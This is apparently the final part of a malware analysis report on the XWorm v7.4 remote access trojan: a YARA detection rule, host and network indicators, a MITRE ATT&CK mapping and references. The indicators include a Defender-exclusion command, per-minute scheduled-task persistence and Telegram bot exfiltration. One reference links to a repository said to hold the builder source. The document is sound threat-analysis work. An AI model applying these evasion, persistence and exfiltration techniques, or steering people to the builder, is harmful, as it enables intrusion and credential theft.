```yara
import "vt"
rule Xworm_v7_4
{
    meta:
        description = "Yara rule based on the point in common between different basic & obfuscated samples"
        author = "DreadFog"
        target_entity = "file"
    strings:
        $0 = "MyApplication.app"
        $1 = "4System.Web.Services.Protocols.SoapHttpClientProtocol"
        $2 = {00340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E00}
        $3 = "ns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\">\x0D\n  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>\x0D\n  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">\x0D\n    <security>\x0D\n      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">\x0D\n        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>\x0D\n      </requestedPrivileges>\x0D\n    </security>\x0D\n  </trustInfo>\x0D\n</assembly>\x0D\n"
        $4 = {0000EFBBBF3C3F786D6C2076657273696F6E3D22312E302220656E636F64696E673D225554462D3822207374616E64616C6F6E653D22796573223F3E0D0A3C617373}
        $5 = {726976696C656765733E0D0A202020203C2F73656375726974793E0D0A20203C2F7472757374496E666F3E0D0A3C2F617373656D626C793E0D0A0000000000000000000000000000}
        $6 = {080100010000000000052002010E0E1801000A4D7954656D706C6174650831342E302E302E300000}
        $7 = {0801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F77730129010024}
        $8 = {0234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F}
        $9 = "Microsoft.VisualBasic.CompilerServices"
    condition:
        vt.metadata.new_file and
        all of them
}
```

### 7.2 Host & Network Indicators

- Mutex-derived AES-ECB key (MD5 of mutex, 16→32-byte overlap copy at offset 15).
- Raw TCP C2 with length-prefixed, AES-ECB-encrypted frames; periodic `PING!`/`pong` beacons with 10–15 s jitter.
- `%temp%\Log.tmp` keylog file.
- `uninstall` self-delete `.bat` in `%temp%`.
- Telegram C2 channel: `https://api.telegram.org/bot<token>/sendMessage` (TBotNotify build).
- Defender exclusion via `Add-MpPreference -ExclusionPath/-ExclusionProcess` (WDEX build).
- Scheduled task `schtasks.exe /create /f /RL HIGHEST /sc minute /mo 1 ...`.
- Registry Run-key value under `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`.
- DDoS HTTP POST floods with fixed `Content-Length: 5235` and the three hardcoded User-Agents (Section 4.8).

## 8. MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique | Observed Behavior |
|---|---|---|---|
| Initial Access | T1091 | Replication Through Removable Media | USB spreading via copied executable + LNK lure (6.8) |
| Execution | T1059.001 | Command and Scripting Interpreter: PowerShell | `DW` command, WDEX exclusion, config-extraction patterns |
| Execution | T1059.003 | Command and Scripting Interpreter: Windows Command Shell | `RunShell`, `cmd.exe` USB shortcut, uninstall `.bat` |
| Execution | T1129 | Shared Modules | Plugin DLLs loaded at runtime via `savePlugin` |
| Execution | T1106 | Native API | `RtlSetProcessIsCritical`, `GetDriverDescriptionA`, `CheckRemoteDebuggerPresent` |
| Execution | T1204.002 | User Execution: Malicious File | Operator-staged payloads via `LN`/`update`/`FM` |
| Persistence | T1547.001 | Registry Run Keys / Startup Folder | Run-key value and Startup `.lnk` (6.7) |
| Persistence | T1053.005 | Scheduled Task/Job: Scheduled Task | `schtasks.exe` per-minute task (6.7) |
| Privilege Escalation | T1548.002 | Abuse Elevation Control Mechanism: Bypass UAC | `Vanguard.dll` UAC bypass plugin; `UACFunc` method |
| Privilege Escalation | T1134 | Access Token Manipulation | RE-Run as Administrator (`VectorFlow.dll`) |
| Defense Evasion | T1562.001 | Impair Defenses: Disable or Modify Tools | WDEX Defender exclusions (6.4); Botkiller (`VortexLoop.dll`) |
| Defense Evasion | T1027 | Obfuscated Files or Information | Dual obfuscators: name + control-flow/non-ASCII (6.9) |
| Defense Evasion | T1140 | Deobfuscate/Decode Files or Information | AES-ECB config/traffic decryption (4.1) |
| Defense Evasion | T1497.001 | Virtualization/Sandbox Evasion: System Checks | AntiAnalysis VM/debugger/Sandboxie checks (6.6) |
| Defense Evasion | T1564.003 | Hide Artifacts: Hidden Window | Hidden-window process launches; HiddenVNC/Hidden Apps plugins |
| Defense Evasion | T1055 | Process Injection | `injRun`/RunPE plugins (`DivineMesh.dll`, etc.) |
| Defense Evasion | T1112 | Modify Registry | `ShowSuperHidden`, Run-key, Registry Editor plugin |
| Defense Evasion | T1070.004 | Indicator Removal: File Deletion | `uninstall` self-delete `.bat` |
| Defense Evasion | T1036 | Masquerading | `MyApplication.app` manifest; Windows Update lure (`ApexLogic.dll`) |
| Defense Evasion | T1014 | Rootkit | `RadarScope.dll` rootkit; `OxygenCloud.dll` bootkit |
| Credential Access | T1555.003 | Credentials from Web Browsers | Chromium Recovery (`CinderFlow.dll`), password recovery plugins |
| Credential Access | T1555 | Credentials from Password Stores | `EtherNet.dll`, `CipherLink.dll`, `SolarSpire.dll` recovery |
| Credential Access | T1056.001 | Input Capture: Keylogging | Built-in keylogger + `SectorNine.dll` live keylogger (6.5) |
| Discovery | T1057 | Process Discovery | Process Manager (`VividSnap.dll`), foreground-window reporting |
| Discovery | T1082 | System Information Discovery | `INFO` fingerprint: OS, CPU, GPU, RAM (4.5) |
| Discovery | T1518.001 | Security Software Discovery | AV enumeration via `SecurityCenter2` (4.5) |
| Discovery | T1033 | System Owner/User Discovery | `Environment.UserName` in fingerprint |
| Discovery | T1124 | System Time Discovery | Idle-time accounting thread (4.3) |
| Discovery | T1016 | System Network Configuration Discovery | Hosts-file read (`Hosts`), TCP connections plugin |
| Discovery | T1083 | File and Directory Discovery | File Manager / File Searcher plugins |
| Collection | T1115 | Clipboard Data | Clipboard Manager plugin; Clipper monitoring (6.3) |
| Collection | T1113 | Screen Capture | `$Cap` screenshot command (4.7) |
| Collection | T1125 | Video Capture | Webcam live feed (`LithiumLoop.dll`) |
| Collection | T1123 | Audio Capture | Microphone / system-sound plugins (`ZenithPixel.dll`, `StaticVoid.dll`) |
| Command and Control | T1071.001 | Application Layer Protocol: Web Protocols | Telegram API exfil (6.2); `Urlopen`/`Urlhide` |
| Command and Control | T1095 | Non-Application Layer Protocol | Raw TCP socket C2 (4.4) |
| Command and Control | T1573.001 | Encrypted Channel: Symmetric Cryptography | AES-ECB-encrypted C2 traffic (4.6) |
| Command and Control | T1105 | Ingress Tool Transfer | `LN`/`update`/`DW` payload download; plugin delivery |
| Command and Control | T1090 | Proxy | Reverse Proxy plugin (`FissionGate.dll`) |
| Command and Control | T1219 | Remote Access Software | Remote Desktop (`BerylSync.dll`), HiddenVNC plugins |
| Impact | T1486 | Data Encrypted for Impact | Ransomware plugin (`PhantomArch.dll`); `ENC`/`DEC` methods |
| Impact | T1498 | Network Denial of Service | `StartDDos` HTTP POST flood (4.7) |
| Impact | T1529 | System Shutdown/Reboot | `PCShutdown`/`PCRestart`/`PCLogoff` (4.7) |
| Impact | T1565.001 | Stored Data Manipulation | `Shosts` hosts-file overwrite; clipboard hijack (6.3) |

---

**References:**
- https://iqblack.com/insight/xworm-v75-new-crimeware-announcement-reinforces-web/
- https://www.youtube.com/watch?v=Sy2yWNN9VX0
- Telegram channel (V7 changelog): https://t.me/s/XWormV7
- Builder source: https://github.com/Cryakl/Ultimate-RAT-Collection/tree/main/XWorm/XWorm%20V7.4

---